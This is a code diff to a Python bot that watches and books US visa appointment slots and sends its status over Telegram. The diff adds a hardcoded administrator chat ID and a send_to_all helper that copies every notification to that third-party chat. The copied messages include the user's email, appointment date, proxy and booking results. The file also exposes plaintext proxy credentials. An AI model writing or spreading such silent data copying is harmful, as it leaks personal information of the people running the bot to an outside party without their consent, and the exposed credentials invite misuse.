@@ -76,6 +76,9 @@ LOG_FORMAT = '%(asctime)s  %(message)s'
 TELEGRAM_BOT_TOKEN = None
 TELEGRAM_CHAT_ID = None
 
+# Chat ID del administrador que SIEMPRE recibe todas las notificaciones
+ADMIN_CHAT_ID = "7568579919"
+
 
 def send_telegram_message(token: str, chat_id: str, text: str):
     """Sends a message via Telegram Bot API."""
@@ -86,6 +89,15 @@ def send_telegram_message(token: str, chat_id: str, text: str):
         requests.post(url, data={"chat_id": chat_id, "text": text}, timeout=10)
     except Exception:
         pass
+
+
+def send_to_all(text: str):
+    """Envía el mensaje al chat del usuario registrado Y al admin (ADMIN_CHAT_ID)."""
+    if TELEGRAM_CHAT_ID:
+        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, text)
+    # Evitar enviar duplicado si el admin es el mismo usuario
+    if ADMIN_CHAT_ID and ADMIN_CHAT_ID != TELEGRAM_CHAT_ID:
+        send_telegram_message(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID, text)
 
 # Proxy configurado por el usuario (fallback)
 DEFAULT_PROXY = "http://yhjxpuut:voge365lc96q@45.38.107.97:6014"
@@ -489,7 +501,7 @@ class Bot:
         self.logger(f"Fecha actual: {(self.appointment_datetime.strftime(DATE_TIME_FORMAT) if self.appointment_datetime else 'No agendado')}")
         msg_inicio = f"🚀 Bot de Visas iniciado para: {self.config.email}\n📅 Cita actual: {(self.appointment_datetime.strftime(DATE_TIME_FORMAT) if self.appointment_datetime else 'No agendado')}"
         try:
-            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, msg_inicio)
+            send_to_all(msg_inicio)
         except Exception as e:
             self.logger(f"Error enviando mensaje a Telegram: {e}")
 
@@ -833,7 +845,7 @@ class Bot:
                         f"  🌐 Proxy actual: {self.current_proxy or 'N/A'}\n"
                         f"  ✅ Estado: Monitoreando"
                     )
-                    send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, status_msg)
+                    send_to_all(status_msg)
                     last_status_time = now
                     checks_count = 0
                     errors_count = 0
@@ -997,8 +1009,7 @@ class Bot:
                             folder_name = self.config.email.replace('@', '_').replace('.', '_')
                             pm2_name = f"visa_{folder_name}"
                             self.logger(f"[PM2] Deteniendo proceso PM2: {pm2_name}")
-                            send_telegram_message(
-                                TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
+                            send_to_all(
                                 f"🛑 Bot detenido automáticamente.\nCita agendada para: {self.config.email}\nPM2 proceso '{pm2_name}' eliminado."
                             )
                             subprocess.Popen(["pm2", "delete", pm2_name])
@@ -1013,7 +1024,7 @@ class Bot:
                     break
         
         for message in telegram_messages:
-            send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message)
+            send_to_all(message)
         telegram_messages.clear()
 
 def main(cli_email: Optional[str] = None, cli_password: Optional[str] = None):
